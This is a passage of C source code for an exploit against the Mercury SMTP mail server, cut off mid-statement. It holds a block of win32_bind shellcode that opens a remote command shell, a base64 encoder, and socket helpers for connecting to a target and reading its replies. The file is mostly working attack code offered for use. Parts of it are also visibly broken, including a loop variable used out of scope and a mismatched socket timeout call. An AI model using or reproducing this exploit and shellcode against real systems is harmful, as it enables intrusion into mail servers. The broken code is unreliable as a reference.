// Compile with gcc -o mercury_smtpd_exploit mercury_smtpd_exploit.c -lstdc++ -lpthread

#include <cstdio>      // For printf
#include <cstring>     // For strlen, memset, memcpy
#include <cstdlib>     // For atoi
#include <unistd.h>    // For close (instead of closesocket)
#include <arpa/inet.h> // For inet_addr, sockaddr_in
#include <sys/socket.h> // For socket functions
#include <netinet/in.h> // For sockaddr_in

// win32_bind shellcode (replace with relevant shellcode)
unsigned char shellcode[] =
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
"\x66\x68\x04\x82\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
"\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0";

// Base64 encoding function
char GetB64Char(int index)
{
    const char szBase64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    if (index >= 0 && index < 64)
        return szBase64Table[index];

    return '=';
}

inline int Base64Encode(char *base64code, const char *src, int src_len)
{
    if (src_len == 0)
        src_len = strlen(src);

    int len = 0;
    unsigned char* psrc = (unsigned char*)src;
    char *p64 = base64code;
    for (int i = 0; i < src_len - 3; i += 3)
    {
        unsigned long ulTmp = *(unsigned long*)psrc;
        int b0 = GetB64Char((ulTmp >> 2) & 0x3F);
        int b1 = GetB64Char((ulTmp << 6 >> 2 | ulTmp >> 4) & 0x3F);
        int b2 = GetB64Char((ulTmp << 4 >> 2 | ulTmp >> 6) & 0x3F);
        int b3 = GetB64Char((ulTmp << 2 >> 2) & 0x3F);
        *((unsigned long*)p64) = b0 | b1 << 8 | b2 << 16 | b3 << 24;
        len += 4;

        p64 += 4;
        psrc += 3;
    }

    // Handle remaining bytes
    if (i < src_len)
    {
        int rest = src_len - i;
        unsigned long ulTmp = 0;
        for (int j = 0; j < rest; ++j)
        {
            *(((unsigned char*)&ulTmp) + j) = *psrc++;
        }

        p64[0] = GetB64Char((ulTmp >> 2) & 0x3F);
        p64[1] = GetB64Char((ulTmp << 6 >> 2 | ulTmp >> 4) & 0x3F);
        p64[2] = rest > 1 ? GetB64Char((ulTmp << 4 >> 2 | ulTmp >> 6) & 0x3F) : '=';
        p64[3] = rest > 2 ? GetB64Char((ulTmp << 2 >> 2) & 0x3F) : '=';
        p64 += 4;
        len += 4;
    }

    *p64 = '\0';
    return len;
}

// Error message handling
char* GetErrorMessage(int err)
{
    static char ErrorMessage[1024];
    snprintf(ErrorMessage, sizeof(ErrorMessage), "Error code: %d", err);
    return ErrorMessage;
}

// Connection handling
int MakeConnection(char *address, int port, int timeout)
{
    struct sockaddr_in target;
    int s;
    int i;
    int bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if(s < 0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr == INADDR_NONE)
    {
        close(s);
        return -2;
    }
    target.sin_port = htons((short)port);
    bf = 1;
    if(setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&bf, sizeof(bf)) < 0)
    {
        close(s);
        return -3;
    }
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s, &wd);
    connect(s, (struct sockaddr *)&target, sizeof(target));
    if((i = select(s + 1, 0, &wd, 0, &tv)) == -1)
    {
        close(s);
        return -4;
    }
    if(i == 0)
    {
        close(s);
        return -5;
    }
    if(getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&bf, (socklen_t *)&i) < 0 || bf != 0)
    {
        close(s);
        return -6;
    }
    return s;
}

int check_recv(int s, char* str_sig)
{
    char buf[1024];
    int ret;

    while(1)
    {
        memset(buf, 0, sizeof(buf));
        ret = recv(s, buf, sizeof(buf), 0);
        if(ret > 0)
        {
            printf("[S] %s", buf);
        }
        else
        {
            printf("[-] recv() %s\n", Get
